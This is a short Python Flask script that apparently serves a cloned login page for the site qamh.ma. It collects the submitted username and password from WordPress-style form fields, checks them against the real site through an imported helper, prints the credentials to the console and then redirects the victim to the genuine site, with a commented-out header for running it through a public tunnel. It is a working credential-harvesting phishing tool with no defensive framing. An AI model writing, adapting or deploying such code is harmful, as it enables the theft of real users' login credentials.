from flask import Flask,redirect,render_template,request
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import chekc
import socket
import bieutf
ip = socket.gethostbyname(socket.gethostname())

# Disable warnings from urllib3 about insecure HTTPS requests
urllib3.disable_warnings()
app = Flask('__name__')
@app.route("/")
def index():
    return render_template("qamh.html")

# @app.after_request
# def apply_headers(response):
#     response.headers['bypass-tunnel-reminder'] = 'any-value'
#     response.headers['User-Agent'] = 'CustomUserAgent/1.0'
#     return response

@app.route('/',methods=['POST'])
def credentiols():
    username = request.form["log"]
    password = request.form['pwd']
    c = chekc.post(username,password)
    if c == 1:
        print("username =" + username)
        print("password = "+password)
        return redirect("https://qamh.ma")
    else :
        b = bieutf.half(c)
        print("username =" + username)
        print("password = "+password)
        return b

if __name__== "__main__":
    app.run(host=ip,port=3000)
